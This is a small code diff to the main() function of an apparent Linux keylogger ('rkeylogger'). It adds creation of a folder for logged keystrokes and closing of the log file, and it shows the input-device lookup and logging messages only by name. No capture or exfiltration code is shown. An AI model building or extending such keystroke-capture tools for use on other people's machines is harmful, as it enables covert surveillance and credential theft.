@@ -2,6 +2,11 @@
 #include <iostream>
 
 int main() {
+    if(!create_rkeylogger_folder()){
+        std::cerr << "[ ERROR ]: Error, cannot create folder to save the logged file" << "\n";
+        return EXIT_FAILURE;
+    }
+
     std::string devnode = guess_input_file();
     if(devnode.empty()){
         std::cerr << "[ ERROR ]: Cannot use libudev.h" << std::endl;
@@ -15,7 +20,7 @@ int main() {
         return EXIT_FAILURE;
     }
 
-
+    close_lastfile();
     std::cout << "[ LOG ]: Logging keyboard finished with success !!" << std::endl;
     return EXIT_SUCCESS;
 }
